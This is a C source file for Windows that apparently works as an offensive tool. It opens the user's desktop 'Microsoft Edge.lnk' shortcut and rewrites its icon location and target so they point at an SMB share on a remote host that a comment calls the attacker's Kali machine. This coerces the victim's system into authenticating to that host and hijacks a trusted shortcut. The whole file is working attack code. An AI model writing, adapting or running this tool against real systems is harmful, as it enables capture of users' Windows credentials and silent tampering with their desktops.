#define COBJMACROS
#include <windows.h>
#include <shlobj.h>
#include <stdio.h>
#include <wchar.h>


BOOL QuickShift(LPCWSTR ShortCut, LPCWSTR NewPath) {


    //  Initialize the COM library to work on the thread 
    HRESULT hr = CoInitializeEx(NULL, COINIT_APARTMENTTHREADED);
    if (FAILED(hr)) {
        printf("[-] Failed to initialize COM library.\n");
        return 1;
    }

    // Locate the current user's Desktop path dynamically
    PWSTR pszDesktopPath = NULL;
    hr = SHGetKnownFolderPath(&FOLDERID_Desktop, 0, NULL, &pszDesktopPath);
    if (FAILED(hr)) {
        printf("[-] Failed to locate Desktop folder.\n");
        CoUninitialize();
        return FALSE;
    }

    // Define the exact name of the existing shortcut you want to alter
    wchar_t shortcutFullPath[MAX_PATH];
    swprintf_s(shortcutFullPath, MAX_PATH, L"%s\\%s", pszDesktopPath, ShortCut);
    CoTaskMemFree(pszDesktopPath);

    //  Instantiate the IShellLink interface
    IShellLinkW* pShellLink = NULL;
    /*
    Every object exposes a table of function pointers (a vtable). The first three slots are always 
    QueryInterface, AddRef, Release. Everything else is up to the interface
    */
    hr = CoCreateInstance(&CLSID_ShellLink, NULL, CLSCTX_INPROC_SERVER, &IID_IShellLinkW, (LPVOID*)&pShellLink);
    if (FAILED(hr)) {
        printf("[-] Failed to create IShellLink instance.\n");
        CoUninitialize();
        return FALSE;
    }

    // Query for the IPersistFile interface to handle disk I/O + Load the shortcut from disk / save it back to disk
    IPersistFile* pPersistFile = NULL;
    hr = pShellLink->lpVtbl->QueryInterface(pShellLink, &IID_IPersistFile, (LPVOID*)&pPersistFile);
    if (FAILED(hr)) {
        printf("[-] Failed to query IPersistFile interface.\n");
        pShellLink->lpVtbl->Release(pShellLink);
        CoUninitialize();
        return FALSE;
    }

    // Load the target shortcut from the user's desktop
    hr = pPersistFile->lpVtbl->Load(pPersistFile, shortcutFullPath, STGM_READWRITE);
    if (FAILED(hr)) {
        printf("[-] Failed to load shortcut. Verify the name exists on the Desktop.\n");
        pPersistFile->lpVtbl->Release(pPersistFile);
        pShellLink->lpVtbl->Release(pShellLink);
        CoUninitialize();
        return FALSE;
    }

    // Point the icon path to your Kali IP, mapping to the 'public' share name      
    hr = pShellLink->lpVtbl->SetIconLocation(pShellLink, NewPath, 0);

    if (SUCCEEDED(hr)) {
        // Save modifications back to the existing file
        pShellLink->lpVtbl->SetPath(pShellLink, L"explorer.exe");
        pShellLink->lpVtbl->SetArguments(pShellLink, NewPath);
        hr = pPersistFile->lpVtbl->Save(pPersistFile, NULL, TRUE);
        if (SUCCEEDED(hr)) {
            printf("[+] Shortcut modified successfully.\n");
        }
        else {
            printf("[-] Failed to save changes to disk.\n");
        }
    }

    // Clean up - might use goto !!!!
    pPersistFile->lpVtbl->Release(pPersistFile);
    pShellLink->lpVtbl->Release(pShellLink);
    CoUninitialize();
    return TRUE;

}


int wmain() {


    wchar_t* OldPath = L"Microsoft Edge.lnk";
    wchar_t* NewPath = L"\\\\10.0.2.10\\public\\assets\\icon.ico";

    if (!QuickShift(OldPath, NewPath)) {
        printf("[-] QuickShift failed with error \n");
        return 1;
    }

    printf("[+] DONE !! \n");
    
    return 0;
}